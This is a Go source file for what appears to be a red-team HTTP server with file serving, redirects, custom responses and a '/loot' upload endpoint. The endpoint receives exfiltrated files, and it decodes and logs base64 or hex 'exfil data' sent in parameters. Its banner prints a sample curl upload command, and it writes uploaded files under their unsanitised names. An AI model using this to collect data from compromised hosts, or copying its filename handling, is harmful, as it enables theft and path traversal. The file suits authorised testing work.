package goserver

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"net/url"
	"strings"
	"unicode"

	"github.com/gorilla/mux"
	"github.com/projectdiscovery/sslcert"
)

// "github.com/caddyserver/certmagic"  << try out certmagic for auto letsencrypt certs

const (
	Reset  = "\033[0m"
	Red    = "\033[31m"
	Green  = "\033[32m"
	Yellow = "\033[33m"
	Blue   = "\033[34m"
	Purple = "\033[35m"
	Cyan   = "\033[36m"
	Gray   = "\033[37m"
	White  = "\033[97m"
)

type HTTPConfig struct {
	Dump            bool
	WorkDir         string
	DoAuth          bool
	Username        string
	Password        string
	RedirectURL     string
	Addr            string
	Port            string
	SSL             bool
	SSLCert         string
	SSLKey          string
	SSLDomain       string
	Headers         map[string]string
	CustomResponses map[string]string
	JSONDoLog       bool
	JSONLogFile     string
	Silent          bool
	server          *http.Server
	ctx             *context.Context
	router          *mux.Router
	Running         bool
}

// var HttpCfg HTTPConfig
func New() *HTTPConfig {
	ret := &HTTPConfig{}
	ret.Headers = make(map[string]string)
	ret.CustomResponses = make(map[string]string)

	return ret
}

func (hc *HTTPConfig) CheckAuth(r *http.Request) bool {
	if !hc.DoAuth {
		return true
	}

	u, p, ok := r.BasicAuth()
	if !ok {
		return false
	}
	if u != hc.Username {
		return false
	}
	if p != hc.Password {
		return false
	}
	return true
}

func (hc *HTTPConfig) DropLoot(w http.ResponseWriter, r *http.Request) {
	auth := hc.CheckAuth(r)
	hc.DumpReq(w, r, auth)
	hc.LogRequest(r)
	if !auth {
		return
	}

	r.ParseMultipartForm(10 << 20)

	file, handler, err := r.FormFile("file")
	if err != nil {
		fmt.Println(Red+"[ERROR] Retrieving the File", Reset)
		fmt.Println(err)
		return
	}
	defer file.Close()

	fileBytes, err := ioutil.ReadAll(file)
	if err != nil {
		fmt.Println(err)
	}

	err = ioutil.WriteFile(hc.WorkDir+"/"+handler.Filename, fileBytes, 0644)
	if err != nil {
		fmt.Println(Red+"[ERROR] Failed to write local file:", hc.WorkDir+"/"+handler.Filename, Reset)
		return
	}
	fmt.Println(Green+"[+] Uploaded File:", handler.Filename, Reset)
}

func (hc *HTTPConfig) DumpReq(w http.ResponseWriter, req *http.Request, auth bool) {
	authmsg := ""
	if hc.DoAuth {
		if auth {
			authmsg = Green + "(Auth Valid)" + Reset
		} else {
			authmsg = Red + "(Auth Failed)" + Reset
		}

	}
	exmsg := ""
	exfil := hc.parseExfil(req)
	log.Println(req.Method, "from", req.RemoteAddr+":", req.URL.Path, authmsg, exmsg)
	if len(exfil) > 0 {
		tmp := []string{}
		for k, v := range exfil {
			tmp = append(tmp, k+"="+strings.TrimRight(v, "\n"))
		}
		fmt.Printf("     └─ Exfil data detected: %s\n", strings.Join(tmp, ",")) // ├  <<< if we need it.
	}
	if hc.Dump {
		qp := ""
		query := hc.parseParams(req.URL.RawQuery)

		if len(req.URL.RawQuery) > 0 {
			qp = "?" + query
		}

		// fmt.Println(req.Method + " " + req.URL.Path + qp + " " + req.Proto)

		body, err := ioutil.ReadAll(req.Body)

		if err != nil {
			log.Println(Red+"[ERROR] reading body:", err, Reset)
			return
		}

		// fmt.Println()
		// fmt.Println()

		fmt.Println(Cyan + "-------------------------------------- Request --------------------------------------")

		fmt.Println(req.Method + " " + req.URL.Path + qp + " " + req.Proto)
		fmt.Println("Host: " + req.Host)
		for k := range req.Header {
			fmt.Println(k + ": " + req.Header.Get(k))
		}
		fmt.Printf("\n\n")
		tmpBody := hc.parseParams(string(body))

		fmt.Println(tmpBody)
		req.Body.Close() //  must close
		req.Body = ioutil.NopCloser(bytes.NewBuffer(body))
		fmt.Println("-------------------------------------------------------------------------------------", Reset)

	}

}

// parseExfil returns a map of any GET/POST params that successfully decode from hex or base64.
func (hc *HTTPConfig) parseExfil(req *http.Request) map[string]string {
	ret := make(map[string]string)
	data := req.URL.RawQuery
	body, err := ioutil.ReadAll(req.Body)
	if err == nil {
		if len(data) > 0 {
			data = "&" + data
		}
		data += string(body)
	}
	req.Body = ioutil.NopCloser(bytes.NewBuffer(body))
	parts := strings.Split(data, "&")
	if len(parts) > 0 {
		for _, set := range parts {
			setparts := strings.SplitN(set, "=", 2)
			if len(setparts) < 2 {
				continue
			}
			decodeddata := urlDecode(setparts[1])
			trydecode := decodeHexOrBase64(decodeddata)
			if trydecode != setparts[1] {
				data = strings.Replace(data, setparts[1], trydecode, 1)
				ret[setparts[0]] = trydecode
			}
		}
	}
	return ret

}

// parseParams handles replaceing hex or base64 decoded data in a dump.
func (hc *HTTPConfig) parseParams(data string) string {
	parts := strings.Split(data, "&")
	if len(parts) > 0 {
		for _, set := range parts {
			setparts := strings.SplitN(set, "=", 2)
			if len(setparts) < 2 {
				continue
			}
			decodeddata := urlDecode(setparts[1])
			trydecode := strings.TrimRight(decodeHexOrBase64(decodeddata), "\n")
			if trydecode != setparts[1] {
				data = strings.Replace(data, setparts[1], trydecode, 1)
			}
		}
	}
	return data
}

func urlDecode(encodedValue string) string {
	var err error
	decodedValue := encodedValue

	decodedValue, err = url.QueryUnescape(encodedValue)
	if err != nil {
		return encodedValue
	}
	return decodedValue
}
func b64Decode(encodedValue string) string {
	data, err := base64.StdEncoding.DecodeString(encodedValue)
	if err != nil {
		return encodedValue
	}
	return string(data)
}
func decodeHexOrBase64(content string) string {
	result := content
	dat := []byte(content)
	isHex := true
	for _, v := range dat {
		if v >= 48 && v <= 57 || v >= 65 && v <= 70 || v >= 97 && v <= 102 {
			// isHex = true
		} else {
			isHex = false
			break
		}
	}
	if isHex {
		if strings.HasPrefix(content, "0x") {
			strings.Replace(content, "0x", "", 1)
		}

		d, err := hex.DecodeString(content)
		if err == nil {
			result = string(d)
		}

	} else {
		r, _ := base64.StdEncoding.DecodeString(content)
		result = string(r)
	}

	if isASCII(result) {
		return result
	}
	return content

}

func isASCII(s string) bool {
	for i := 0; i < len(s); i++ {
		if s[i] > unicode.MaxASCII {
			return false
		}
	}
	return true
}
func (hc *HTTPConfig) ServeFiles(h http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		auth := hc.CheckAuth(r)
		hc.DumpReq(w, r, auth)
		hc.LogRequest(r)
		if !auth {
			return
		}
		for k, v := range hc.Headers {
			w.Header().Add(k, v)
		}

		h.ServeHTTP(w, r) // call original
	})
}

func (hc *HTTPConfig) ServeRedir(w http.ResponseWriter, r *http.Request) {
	auth := hc.CheckAuth(r)
	hc.DumpReq(w, r, auth)
	hc.LogRequest(r)
	http.Redirect(w, r, hc.RedirectURL, http.StatusSeeOther)
}

func (hc *HTTPConfig) ServeCustom(w http.ResponseWriter, r *http.Request) {
	auth := hc.CheckAuth(r)
	hc.DumpReq(w, r, auth)
	hc.LogRequest(r)
	log.Println("Request for", r.URL.Path, "reading response from:", hc.CustomResponses[r.URL.Path])
	f, err := ioutil.ReadFile(hc.CustomResponses[r.URL.Path])
	if err != nil {
		log.Fatal("err")
	}

	prts := strings.SplitN(string(f), "\n\n", 2)
	for _, h := range strings.Split(prts[0], "\n") {
		if strings.HasPrefix(h, "HTTP") {
			continue
		}
		tmp := strings.Replace(h, ": ", ":", -1)
		kv := strings.SplitN(tmp, ":", 2)
		w.Header().Set(strings.ToLower(kv[0]), kv[1])
		//
	}
	w.Header().Set("content-length", fmt.Sprintf("%d", len(prts[1])))
	w.WriteHeader(200)       // write status code
	w.Write([]byte(prts[1])) // write body
}

func (hc *HTTPConfig) ListURLs(addr, port string, ssl bool) {

	scheme := "http"
	if ssl {
		scheme = "https"
	}
	fmt.Println(Blue+"[!] Starting web server at:", Reset)
	if addr != "" {
		fmt.Println(Yellow+"     "+scheme+"://"+addr+":"+port, Reset)
	} else {
		ip, err := net.InterfaceAddrs()
		if err == nil {
			for _, v := range ip {
				fmt.Println(Yellow+"     "+scheme+"://"+strings.Split(v.String(), "/")[0]+":"+port, Reset)

			}
		}
	}
	fmt.Println()
}

func (hc *HTTPConfig) ShutDown() {
	log.Println("Shutting down the HTTP/s server...")
	hc.server.Shutdown(*hc.ctx)
	hc.Running = false
}

func (hc *HTTPConfig) SetupRoutes() {
	hc.router = mux.NewRouter()
	hc.router.HandleFunc("/loot", hc.DropLoot)
	if hc.RedirectURL == "" {
		hc.router.Handle("/", hc.ServeFiles(http.FileServer(http.Dir(hc.WorkDir))))
	} else {
		hc.router.HandleFunc("/", hc.ServeRedir)
	}

	if len(hc.CustomResponses) > 0 {
		for k, _ := range hc.CustomResponses {
			hc.router.HandleFunc(k, hc.ServeCustom)
		}
	}
	hc.server.Handler = hc.router
}

func (hc *HTTPConfig) Run() {
	if hc.SSL {
		log.Println("Starting HTTPs at", hc.Addr+":"+hc.Port)
	} else {
		log.Println("Starting HTTP at", hc.Addr+":"+hc.Port)
	}

	if !hc.Silent {
		fmt.Println(Blue + "[!] Upload URI: /loot (curl -F \"file=@./file.txt\" http[s]://address:port/loot)" + Reset)
		fmt.Println(Blue + "[!] Special Params: base64 (GET/POST)" + Reset)
		fmt.Println(Blue+"[!] Dump Requests:", hc.Dump, Reset)
		fmt.Println(Blue+"[!] Auth Enabled:", hc.DoAuth, Reset)
		fmt.Println(Blue+"[!] Working Directory:", hc.WorkDir, Reset)
		fmt.Println(Blue+"[!] SSL Enabled:", hc.SSL, Reset)
		hc.ListURLs(hc.Addr, hc.Port, hc.SSL)
	}

	hc.server = &http.Server{
		Addr: hc.Addr + ":" + hc.Port,
		// Handler: hc.router,
	}
	hc.SetupRoutes()
	ctx, cancel := context.WithTimeout(context.Background(), 10)

	defer cancel()
	hc.ctx = &ctx
	hc.Running = true
	if hc.SSL {
		if hc.SSLCert == "" || hc.SSLKey == "" {
			tlsOptions := sslcert.DefaultOptions
			tlsOptions.Host = hc.SSLDomain
			tlsConfig, err := sslcert.NewTLSConfig(tlsOptions)
			if err != nil {
				log.Println(err)
			}
			hc.server.TLSConfig = tlsConfig
		}

		err := hc.server.ListenAndServeTLS(hc.SSLCert, hc.SSLKey)
		if err != nil {
			log.Println("ListenAndServeTLS: ", err)
		}

	} else {
		err := hc.server.ListenAndServe()
		if err != nil {
			log.Println("ListenAndServeTLS: ", err)
		}
	}
	hc.Running = false
}
